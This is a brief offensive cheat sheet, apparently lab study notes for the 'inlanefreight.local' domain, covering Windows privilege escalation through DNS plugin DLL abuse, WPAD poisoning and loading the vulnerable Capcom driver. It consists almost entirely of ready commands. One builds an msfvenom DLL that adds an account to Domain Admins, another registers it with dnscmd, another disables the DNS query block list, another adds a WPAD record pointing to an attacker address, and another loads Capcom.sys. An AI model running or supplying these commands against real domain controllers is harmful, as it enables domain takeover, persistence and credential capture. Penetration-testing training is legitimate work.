# DLL Hijacking & Plugin Abuse

Goal: Load malicious DLL for execution.

---

# Generate Malicious DLL

msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

---

# Configure DNS Plugin DLL

dnscmd.exe /config /serverlevelplugindll adduser.dll

---

# Disable DNS Global Query Block List

Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local

---

# Add WPAD Record

Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3

---

# Check Driver Loaded

.\DriverView.exe /stext drivers.txt

cat drivers.txt | Select-String -pattern Capcom

---

# Load Driver

EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

---

# Tactical Notes

- DNS plugin persistence survives reboot.
- WPAD poisoning enables credential capture.
- Driver abuse requires proper privilege.
